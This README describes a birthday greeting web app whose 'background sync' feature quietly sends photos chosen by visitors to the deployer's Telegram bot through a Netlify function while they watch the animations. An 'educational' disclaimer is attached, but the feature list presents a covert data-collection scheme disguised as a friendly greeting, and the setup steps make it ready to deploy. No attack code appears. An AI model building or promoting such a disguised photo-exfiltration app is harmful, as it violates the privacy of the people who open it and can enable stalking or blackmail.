# 🎂 Birthday Surprise Web App

A personalized interactive Birthday web application built with **HTML, CSS, and Vanilla JavaScript**. 

### ⚠️ Disclaimer
**This project is created strictly for EDUCATIONAL and DEMONSTRATION purposes only.** 
The background media sync feature is built as a proof-of-concept to showcase serverless architecture (Netlify Functions) and third-party API integration (Telegram Bot API). The creator is not responsible for any misuse of this project. Always ensure you have explicit consent before collecting or transferring any user data.

---

### ✨ Features
* **Interactive UI:** Click-to-continue, photo selection, and seamless animation flow.
* **Dynamic Media Handling:** Users can select multiple photos, which are converted to Base64.
* **Background Sync:** Media is securely sent to a Telegram Bot in the background while the user views the frontend.
* **Web Audio API:** Plays a custom "Happy Birthday" tune using browser synthesizers (no external MP3 required).
* **Serverless Backend:** Uses Netlify Functions to hide sensitive API keys (Bot Token & Chat ID) from the frontend.

---

### 🛠️ Tech Stack
* **Frontend:** HTML5, CSS3, Vanilla JavaScript
* **Backend (Serverless):** Netlify Functions (Node.js)
* **API:** Telegram Bot API

---

### 🚀 How to Run Locally
1. Clone the repository.
2. Install Netlify CLI (`npm install -g netlify-cli`).
3. Create a `.env` file in the root and add your Telegram credentials:
   ```env
   BOT_TOKEN=your_telegram_bot_token
   CHAT_ID=your_telegram_chat_id
